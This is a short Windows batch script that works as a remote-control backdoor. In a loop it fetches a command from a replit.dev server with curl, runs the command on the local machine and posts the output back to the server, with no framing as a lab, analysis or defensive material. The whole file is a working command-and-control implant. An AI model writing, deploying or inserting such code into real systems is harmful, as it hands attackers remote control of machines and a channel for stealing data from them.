@echo off
setlocal enabledelayedexpansion
set apilink=https://b5519a5e-d6f8-4e25-8a6d-44c50c733ed3-00-3fd9w8cstv4b0.janeway.replit.dev

:CHECK_CMD_CHANGE

:: Use curl to fetch the new command directly and store it in the variable
for /f "delims=" %%i in ('curl -s %apilink%/getcmd') do set new_cmd=%%i

:: Check if the new command is the same as the old one
if "%new_cmd%"=="%cmd%" (
  timeout /t 2 /nobreak >nul
  goto CHECK_CMD_CHANGE
)

:: Update the command variable
set "cmd=%new_cmd%"

:: Execute the command and capture the output directly
for /f "delims=" %%i in ('%cmd%') do set "output=!output! %%i"

:: Send the output back using curl
curl -s -X POST -d "output=!output!" %apilink%/setoutput >nul

:: Clear the output variable for the next command
set "output="

goto CHECK_CMD_CHANGE
endlocal
